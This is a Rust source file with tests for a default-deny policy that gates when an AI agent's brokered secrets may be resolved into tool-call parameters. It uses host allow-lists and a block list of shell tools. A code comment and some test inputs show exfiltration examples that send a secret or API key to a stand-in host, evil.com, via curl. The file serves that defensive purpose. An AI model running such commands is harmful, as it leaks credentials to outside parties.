//! Broker security contract: a default-deny policy deciding whether a broker secret
//! may be resolved into a given tool-call parameter.
//!
//! A broker token reaches the local tool boundary still tokenized (the proxy never
//! resolves it on the wire); the real value is spliced in ONLY here, gated by
//! [`BrokerPolicy::decide`]. The gate is **default-deny** over four axes:
//! - `secret` — per-secret least privilege (a DB password resolves only into psql,
//!   an ssh key only into ssh — never the reverse);
//! - `tool` — which tool may receive a broker value at all (egress-boundary tools
//!   like `mcp__*` / sub-agents are denied FIRST, unconditionally);
//! - `param_pointer` — which JSON-pointer leaf of the tool input;
//! - `dest` — optional destination-host allow-list, parsed from the param so a
//!   secret can't be exfiltrated to `evil.com` via an allowed tool.
//!
//! Honest residual: opaque free-form params (a raw `Bash.command`) are unparseable,
//! so they fail closed (no host → `HostUnparsed` → deny); base64/concat re-encodings
//! inside one allowed string are not defeated unless that tool is denied outright.

use std::time::Duration;

use globset::{Glob, GlobMatcher};

use crate::error::EngineError;

/// The full broker policy: an ordered allow-list over a default-deny base.
#[derive(Clone, Default)]
pub struct BrokerPolicy {
    pub allow: Vec<BrokerAllow>,
}

/// One allow rule. All present axes must match. `secret`/`dest` default to "any".
#[derive(Clone)]
pub struct BrokerAllow {
    /// Per-secret least privilege: matches the registered secret NAME (from the
    /// `StoreEntry`, never parsed from the token). `None` ⇒ any secret.
    pub secret: Option<GlobMatcher>,
    pub tool: GlobMatcher,
    pub param_pointer: GlobMatcher,
    pub dest: Option<DestRule>,
    /// Optional TTL hint for the minted broker token (seeded into the store).
    pub ttl: Option<Duration>,
}

#[derive(Clone, Debug)]
pub enum DestRule {
    /// The destination host parsed from the param must be exactly one of these.
    HostAllowList(Vec<String>),
    /// Any host (the rule does not constrain the destination).
    AnyHost,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum BrokerDecision {
    Resolve,
    Deny(DenyReason),
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum DenyReason {
    /// No allow rule matched (the default).
    NoRule,
    /// The tool is an egress boundary (MCP / sub-agent) — never brokered.
    EgressBoundary,
    /// The tool runs a FREE-FORM shell command (Bash/sh/…) — a broker value could be
    /// concatenated/re-encoded to exfiltrate, so it is never auto-allow-listed
    /// (content-aware argv gating is a deferred expansion). Use a structured tool.
    OpaqueCommand,
    /// A host was parsed but is not on the allow-list.
    HostNotAllowed(String),
    /// The rule requires a host allow-list but no host could be parsed (fail-closed).
    HostUnparsed,
}

impl BrokerAllow {
    /// Compile globs from config strings. `tool`/`param_pointer` are globs (`*`
    /// crosses `/` so RFC-6901 pointers glob naturally); `secret` is an optional
    /// name glob.
    pub fn new(
        secret: Option<&str>,
        tool: &str,
        param_pointer: &str,
        dest: Option<DestRule>,
        ttl: Option<Duration>,
    ) -> Result<Self, EngineError> {
        Ok(Self {
            secret: secret.map(compile_glob).transpose()?,
            tool: compile_glob(tool)?,
            param_pointer: compile_glob(param_pointer)?,
            dest,
            ttl,
        })
    }
}

fn compile_glob(pat: &str) -> Result<GlobMatcher, EngineError> {
    Glob::new(pat)
        .map(|g| g.compile_matcher())
        .map_err(|e| EngineError::InvalidSecret(format!("invalid broker glob {pat:?}: {e}")))
}

impl BrokerPolicy {
    /// Decide whether `secret_name` may resolve into `tool` at JSON-pointer `pointer`,
    /// given the param value `param_value` (the leaf string still carrying the broker
    /// token — used to parse the destination host). DEFAULT-DENY.
    pub fn decide(
        &self,
        secret_name: &str,
        tool: &str,
        pointer: &str,
        param_value: &str,
    ) -> BrokerDecision {
        // Egress-boundary tools are denied FIRST, unconditionally — a broker value
        // must never reach an MCP server or a sub-agent (which we cannot police).
        if is_egress_boundary_tool(tool) {
            return BrokerDecision::Deny(DenyReason::EgressBoundary);
        }
        // Free-form shell-command tools are denied next, unconditionally — even a
        // broad/`AnyHost` allow rule must NOT splice a secret into a raw command
        // (the value could be concatenated to `; curl evil.com $SECRET`). This is
        // the plan's "a free-form command leaf is never auto-allow-listed"; the
        // content-aware-argv path that would make Bash safe is a deferred expansion.
        if is_opaque_command_tool(tool) {
            return BrokerDecision::Deny(DenyReason::OpaqueCommand);
        }
        for a in &self.allow {
            let secret_ok = a.secret.as_ref().map(|g| g.is_match(secret_name)).unwrap_or(true);
            if !(secret_ok && a.tool.is_match(tool) && a.param_pointer.is_match(pointer)) {
                continue;
            }
            return match &a.dest {
                None | Some(DestRule::AnyHost) => BrokerDecision::Resolve,
                Some(DestRule::HostAllowList(hosts)) => match parse_dest_host(tool, param_value) {
                    Some(h) if hosts.iter().any(|x| host_eq(x, &h)) => BrokerDecision::Resolve,
                    Some(h) => BrokerDecision::Deny(DenyReason::HostNotAllowed(h)),
                    None => BrokerDecision::Deny(DenyReason::HostUnparsed),
                },
            };
        }
        BrokerDecision::Deny(DenyReason::NoRule)
    }
}

/// Tools a broker value must NEVER reach: MCP servers and anything that spawns a
/// sub-agent (their downstream egress is outside our policy).
pub(crate) fn is_egress_boundary_tool(t: &str) -> bool {
    t.starts_with("mcp__") || t == "Task" || t == "Agent" || t.starts_with("subagent_")
}

/// Free-form shell-command tools whose param is an opaque command string. A broker
/// value spliced here can't be policed (concat/base64/here-doc exfil), so these are
/// denied regardless of any allow rule.
pub(crate) fn is_opaque_command_tool(t: &str) -> bool {
    matches!(
        t,
        "Bash"
            | "bash"
            | "sh"
            | "shell"
            | "Shell"
            | "zsh"
            | "fish"
            | "dash"
            | "ksh"
            | "pwsh"
            | "powershell"
            | "PowerShell"
            | "cmd"
            | "Execute"
            | "exec"
            | "run_command"
    )
}

/// Exact, ASCII-case-insensitive host match. NO suffix matching, so
/// `evil.com.db.internal` does NOT match an allow-listed `db.internal`.
fn host_eq(rule: &str, parsed: &str) -> bool {
    rule.eq_ignore_ascii_case(parsed)
}

/// Parse the destination host from a tool param value (the leaf carrying the token).
/// Hard-coded for the day-1 host-bearing tools; an unknown/opaque tool returns
/// `None` ⇒ the caller fails closed (`HostUnparsed`).
pub(crate) fn parse_dest_host(tool: &str, value: &str) -> Option<String> {
    match tool {
        "curl" | "wget" | "http" | "https" | "httpie" => url_host(value),
        "psql" | "pg_dump" | "pg_restore" | "pg_dumpall" | "createdb" | "dropdb" => {
            psql_host(value)
        }
        "mysql" | "mariadb" => flag_host(value).or_else(|| url_host(value)),
        "ssh" | "scp" | "sftp" | "rsync" => ssh_host(value),
        // Opaque / unknown tool: not parseable ⇒ fail closed.
        _ => None,
    }
}

/// First http(s)/scheme URL host found in the string. Tries the whole value as a URL
/// first, then scans for a `scheme://` token.
fn url_host(value: &str) -> Option<String> {
    if let Ok(u) = url::Url::parse(value.trim())
        && let Some(h) = u.host_str()
    {
        return Some(h.to_ascii_lowercase());
    }
    for tok in value.split(|c: char| c.is_whitespace() || c == '"' || c == '\'') {
        if tok.contains("://")
            && let Ok(u) = url::Url::parse(tok)
            && let Some(h) = u.host_str()
        {
            return Some(h.to_ascii_lowercase());
        }
    }
    None
}

/// psql host: a `postgres(ql)://` URI host, OR a `-h`/`--host` flag, OR a `host=` DSN
/// key. Splits the value shell-style so flags in a command string are found.
fn psql_host(value: &str) -> Option<String> {
    if let Some(h) = url_host(value) {
        return Some(h);
    }
    if let Some(h) = flag_host(value) {
        return Some(h);
    }
    // libpq DSN: `host=db.internal port=5432 ...`
    for tok in shlex::split(value).unwrap_or_default() {
        if let Some(rest) = tok.strip_prefix("host=")
            && !rest.is_empty()
        {
            return Some(rest.to_ascii_lowercase());
        }
    }
    None
}

/// `-h <host>` / `--host <host>` / `--host=<host>` from a shell-split value.
fn flag_host(value: &str) -> Option<String> {
    let toks = shlex::split(value).unwrap_or_default();
    let mut it = toks.iter();
    while let Some(t) = it.next() {
        if let Some(h) = t.strip_prefix("--host=") {
            return (!h.is_empty()).then(|| h.to_ascii_lowercase());
        }
        if t == "-h" || t == "--host" {
            return it.next().map(|h| h.to_ascii_lowercase());
        }
    }
    None
}

/// ssh target: the first bare (non-flag) token, taking the part after `@` as the host.
fn ssh_host(value: &str) -> Option<String> {
    let toks = shlex::split(value).unwrap_or_default();
    let mut skip_next = false;
    for t in &toks {
        if skip_next {
            skip_next = false;
            continue;
        }
        // The value may be a full command line — skip a leading ssh-family binary.
        if matches!(t.as_str(), "ssh" | "scp" | "sftp" | "rsync") {
            continue;
        }
        if t.starts_with('-') {
            // Flags that take a value (best-effort): skip the following token.
            if matches!(t.as_str(), "-i" | "-p" | "-l" | "-o" | "-F" | "-c") {
                skip_next = true;
            }
            continue;
        }
        let host = t.rsplit('@').next().unwrap_or(t);
        let host = host.split(':').next().unwrap_or(host);
        if !host.is_empty() {
            return Some(host.to_ascii_lowercase());
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    fn allow(secret: Option<&str>, tool: &str, ptr: &str, dest: Option<DestRule>) -> BrokerAllow {
        BrokerAllow::new(secret, tool, ptr, dest, None).unwrap()
    }

    fn policy(allows: Vec<BrokerAllow>) -> BrokerPolicy {
        BrokerPolicy { allow: allows }
    }

    #[test]
    fn default_deny_with_no_rule() {
        let p = policy(vec![]);
        assert_eq!(
            p.decide("db", "psql", "/connection_uri", "postgres://u@db.internal/d"),
            BrokerDecision::Deny(DenyReason::NoRule)
        );
    }

    #[test]
    fn per_secret_least_privilege() {
        // db_password -> psql only; ssh_key -> ssh only.
        let p = policy(vec![
            allow(Some("db_password"), "psql", "/connection_uri", None),
            allow(Some("ssh_key"), "ssh", "/identity", None),
        ]);
        assert_eq!(
            p.decide("db_password", "psql", "/connection_uri", "x"),
            BrokerDecision::Resolve
        );
        // Wrong secret into psql ⇒ no matching rule ⇒ deny.
        assert_eq!(
            p.decide("ssh_key", "psql", "/connection_uri", "x"),
            BrokerDecision::Deny(DenyReason::NoRule)
        );
    }

    #[test]
    fn dest_host_allowlist_blocks_curl_evil() {
        let p = policy(vec![allow(
            Some("db_password"),
            "psql",
            "/connection_uri",
            Some(DestRule::HostAllowList(vec!["db.internal".into()])),
        )]);
        // Allowed host resolves.
        assert_eq!(
            p.decide(
                "db_password",
                "psql",
                "/connection_uri",
                "postgres://u:[BROKER__DB_PASSWORD_aa]@db.internal/d"
            ),
            BrokerDecision::Resolve
        );
        // Wrong host denied (no suffix match either).
        assert_eq!(
            p.decide(
                "db_password",
                "psql",
                "/connection_uri",
                "postgres://u@evil.com/d"
            ),
            BrokerDecision::Deny(DenyReason::HostNotAllowed("evil.com".into()))
        );
        assert!(matches!(
            p.decide(
                "db_password",
                "psql",
                "/connection_uri",
                "postgres://u@db.internal.evil.com/d"
            ),
            BrokerDecision::Deny(DenyReason::HostNotAllowed(_))
        ));
    }

    #[test]
    fn curl_to_evil_is_denied_even_when_curl_allowed() {
        let p = policy(vec![allow(
            Some("api_key"),
            "curl",
            "/url",
            Some(DestRule::HostAllowList(vec!["api.internal".into()])),
        )]);
        assert!(matches!(
            p.decide("api_key", "curl", "/url", "https://evil.com/?x=[BROKER__API_KEY_bb]"),
            BrokerDecision::Deny(DenyReason::HostNotAllowed(_))
        ));
    }

    #[test]
    fn egress_boundary_denied_first() {
        // Even with a matching allow rule, an MCP/Task tool is denied.
        let p = policy(vec![allow(None, "*", "*", None)]);
        assert_eq!(
            p.decide("db", "mcp__github", "/x", "y"),
            BrokerDecision::Deny(DenyReason::EgressBoundary)
        );
        assert_eq!(
            p.decide("db", "Task", "/x", "y"),
            BrokerDecision::Deny(DenyReason::EgressBoundary)
        );
    }

    #[test]
    fn unparseable_host_fails_closed() {
        // A host allow-list rule on a non-opaque tool we cannot parse ⇒ HostUnparsed.
        let p = policy(vec![allow(
            None,
            "customdb",
            "/dsn",
            Some(DestRule::HostAllowList(vec!["db.internal".into()])),
        )]);
        assert_eq!(
            p.decide("db", "customdb", "/dsn", "some-opaque-dsn-string"),
            BrokerDecision::Deny(DenyReason::HostUnparsed)
        );
    }

    #[test]
    fn opaque_command_tool_denied_even_with_broad_rule() {
        // A wildcard, no-dest rule must NOT splice a secret into a free-form command.
        let p = policy(vec![allow(None, "*", "*", None)]);
        assert_eq!(
            p.decide("db", "Bash", "/command", "psql -h db.internal"),
            BrokerDecision::Deny(DenyReason::OpaqueCommand)
        );
        assert_eq!(
            p.decide("db", "sh", "/command", "anything"),
            BrokerDecision::Deny(DenyReason::OpaqueCommand)
        );
    }

    #[test]
    fn host_parsers() {
        assert_eq!(
            parse_dest_host("psql", "psql -h db.internal -U u"),
            Some("db.internal".into())
        );
        assert_eq!(
            parse_dest_host("psql", "postgres://u:pw@db.internal:5432/x"),
            Some("db.internal".into())
        );
        assert_eq!(
            parse_dest_host("psql", "host=db.internal port=5432"),
            Some("db.internal".into())
        );
        assert_eq!(
            parse_dest_host("curl", "https://api.example.com/v1/x?y=1"),
            Some("api.example.com".into())
        );
        assert_eq!(
            parse_dest_host("ssh", "ssh deploy@host.internal uptime"),
            Some("host.internal".into())
        );
        assert_eq!(parse_dest_host("Bash", "anything"), None);
    }
}
